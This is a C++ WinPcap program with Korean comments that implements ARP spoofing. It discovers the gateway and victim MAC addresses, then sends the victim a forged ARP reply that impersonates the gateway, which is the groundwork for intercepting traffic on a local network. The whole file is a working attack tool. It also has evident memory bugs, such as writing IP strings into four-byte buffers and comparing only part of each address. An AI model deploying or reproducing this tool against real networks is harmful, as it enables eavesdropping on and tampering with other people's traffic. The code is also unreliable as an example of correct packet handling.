#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<iostream>
#include<thread>
#include<WinSock2.h>
#define HAVE_REMOTE
#define WPCAP
#include<IPHlpApi.h>
#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<pcap.h>
#include<iomanip>
#include<Iphlpapi.h>
#include<Assert.h>
#include<vector>
#include<string>
using namespace std;

#pragma comment(lib, "ws2_32.lib")		//winsock2
#pragma comment(lib, "wpcap.lib")		//winpcap
#pragma comment(lib, "iphlpapi.lib")	//get mac

#define pcap_src_if_string "rpcap://"
#define TYPE_ARP 0x0806
#define TYPE_ETHERNET 0x0001
#define TYPE_IP 0x0800
#define SIZE_ETHERNET 6
#define SIZE_IP 4
#define REQUEST 1
#define REPLY	2
//#define MAX_THREADS 3

void init() {
#ifdef _WIN32_
	WSADATA wsaData;
	WSAStartup(0x0202, &wsaData);
#endif // _WIN32_
}
void task(pcap_t *handle, struct pcap_pkthdr *header, u_char *packet);
void packet_hand(u_char *buf, int size);
void send_arp_request(pcap_t *handle, byte *mac, char *sip, char *tmac, char *tip, int a);
void getAddr();

typedef struct eth_hdr { //ethernet_header
	unsigned char eth_dest[6];
	unsigned char eth_src[6];
	u_short eth_type;
} ETH_HDR;
typedef struct arp_hdr {//char short int
	u_int16_t arp_hwtype;
	u_int16_t arp_ptype;
	u_int8_t arp_hwlen;
	u_int8_t arp_plen;
	u_int16_t arp_op;
	u_int8_t arp_srcmac[6];
	u_int8_t arp_srcip[4];
	u_int8_t arp_tarmac[6];
	u_int8_t arp_tarip[4];
} ARP_HDR;

struct sockaddr_in src, dest;
ETH_HDR *ethhdr = new ETH_HDR;
ARP_HDR *arphdr = new ARP_HDR;
vector<BYTE> vmymac;
byte *m_mac[6];
char *my_ip = (char*)malloc(sizeof(int));
char *gw_ip = (char*)malloc(sizeof(int));
//char *vic_ip = (char*)malloc(sizeof(int));
char *vic_ip;
int fir, sec;
char tmac[6] = { 0, }, gmac[6];
int main(int argc, char *argv[]) {
	/*---------------------------------------------------------------------------------------------------------------*/
	pcap_t *handle;																	/* Session handle				 */
	struct pcap_pkthdr *header;														/*								 */
	char errbuf[PCAP_ERRBUF_SIZE];													/* Error string					 */
	bpf_u_int32 mask = 0;															/* Our netmask					 */
	bpf_u_int32 net = 0;															/* Our IP						 */
	u_char *packet;																	/*				  				 */
	init();																			/*	 							 */
	pcap_if_t *alldevs, *d;															/*	 							 */
	int i = 0, num;																	/*	 							 */
	/*---------------------------------------------------------------------------------------------------------------*/
	if (pcap_findalldevs_ex(pcap_src_if_string, NULL, &alldevs, errbuf) == -1) {
		fprintf(stderr, "error in pcap_findalldevs_ex: %s\n", errbuf);
		return -1;
	}
	for (d = alldevs; d; d = d->next) {
		printf("%d. %s\n    ", ++i, d->name);
		if (d->description)	printf(" (%s)\n", d->description);
		else printf(" (no description available)\n");
	}
	cout << "select number : ";
	cin >> num;
	for (d = alldevs, i = 0; i < num - 1; d = d->next, i++);
	if ((handle = pcap_open_live(d->name, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1, errbuf)) == NULL) {	//장치이름, 패킷캡쳐부분, promiscuous mode, 시간, 에러버퍼
		fprintf(stderr, "Couldn't open device %s: %s\n", d->name, errbuf);
		return(2);
	}															// packet capture discripter
	vic_ip = argv[1];
	getAddr();													//내주소 가져오기
	for (int i = 0; i < 6; i++) m_mac[i] = &vmymac[i];
	thread t1(task, handle, header, packet);

	send_arp_request(handle, *m_mac, my_ip, tmac, gw_ip, REQUEST);	//게이트웨이 맥주소 get
	Sleep(1000);
	send_arp_request(handle, *m_mac, my_ip, tmac, vic_ip, REQUEST);	//victim 맥주소 get
	Sleep(1000);
	send_arp_request(handle, *m_mac, gw_ip, tmac, vic_ip, REPLY);

	t1.join();
	pcap_close(handle);
	free(my_ip);	free(gw_ip);//free(vic_ip);
	return 0;
}

/* # htons : host bo to network bo short # htonl : host bo to network bo long # ntohs : network bo to host bo short # ntohl : network bo to host bo long # */
void task(pcap_t *handle, struct pcap_pkthdr *header, u_char *packet) {
	int res;
	while ((res = pcap_next_ex(handle, &header, (const u_char **)&packet)) >= 0) {
		if (res == 0) continue;
		else if (res == -1) {
			cout << "pcap_next_ex Error !" << endl;
			break;
		}
		else packet_hand(packet, header->caplen);
	}
}
void packet_hand(u_char *buf, int size) {
	char *s_ip = (char*)malloc(sizeof(int));
	ethhdr = (ETH_HDR *)buf;
	if (ntohs(ethhdr->eth_type) == TYPE_ARP) {//ARP
		arphdr = (ARP_HDR *)(sizeof(ETH_HDR) + buf);
		if (ntohs(arphdr->arp_op) == 0x0002) {
			sprintf(s_ip, "%d.%d.%d.%d", arphdr->arp_srcip[0], arphdr->arp_srcip[1], arphdr->arp_srcip[2], arphdr->arp_srcip[3]);
			if ((!strncmp(s_ip, gw_ip, SIZE_IP)) && fir == 0) {
				cout << "  게이트웨이" << endl;
				memcpy(gmac, arphdr->arp_srcmac, SIZE_ETHERNET);
				fir++;
			}
			else if ((!strncmp(s_ip, vic_ip, SIZE_IP)) && sec == 0) {
				cout << "  타겟" << endl;
				memcpy(tmac, arphdr->arp_srcmac, SIZE_ETHERNET);
				sec++;
			}
		}
	}
	free(s_ip);
}
void send_arp_request(pcap_t *handle, byte *mac, char *sip, char *tmac, char *tip, int a) {
	u_char s_packet[42];
	ethhdr = (ETH_HDR *)s_packet;
	arphdr = (ARP_HDR *)(sizeof(ETH_HDR) + s_packet); // sizeof(eth)
	int size = sizeof(eth_hdr) + sizeof(arp_hdr);
	/*eth*/
	memcpy(ethhdr->eth_dest, tmac, SIZE_ETHERNET);
	memcpy(ethhdr->eth_src, mac, SIZE_ETHERNET);
	ethhdr->eth_type = htons(TYPE_ARP);

	/*arp*/
	arphdr->arp_hwtype = htons(TYPE_ETHERNET);
	arphdr->arp_ptype = htons(TYPE_IP);
	arphdr->arp_hwlen = SIZE_ETHERNET;
	arphdr->arp_plen = SIZE_IP;
	arphdr->arp_op = htons(a);
	if (arphdr->arp_op == htons(REQUEST)) memset(ethhdr->eth_dest, 0xff, SIZE_ETHERNET);
	memcpy(arphdr->arp_srcmac, ethhdr->eth_src, SIZE_ETHERNET);	//보낸사람맥
	inet_pton(AF_INET, sip, arphdr->arp_srcip);					//보낸사람아이피
	memcpy(arphdr->arp_tarmac, tmac, SIZE_ETHERNET);//받는사람맥
	inet_pton(AF_INET, tip, arphdr->arp_tarip);					//받는사람아이피
	if (pcap_sendpacket(handle, s_packet, size) != 0)	cout << "arp error" << endl;
	else cout << "arp send" << endl;
}
void getAddr() {
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);

	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (AdapterInfo == NULL) cout << "Error allocating memory needed to call GetAdaptersinfo" << endl;
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
		if (AdapterInfo == NULL) cout << "Error allocating memory needed to call GetAdaptersinfo" << endl;
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		pAdapterInfo = pAdapterInfo->Next;
		vmymac.clear();
		for (int i = 0; i < 6; i++) vmymac.push_back(pAdapterInfo->Address[i]);
		sprintf(my_ip, "%s", pAdapterInfo->IpAddressList.IpAddress.String);
		sprintf(gw_ip, "%s", pAdapterInfo->GatewayList.IpAddress.String);
	}
	free(AdapterInfo);
}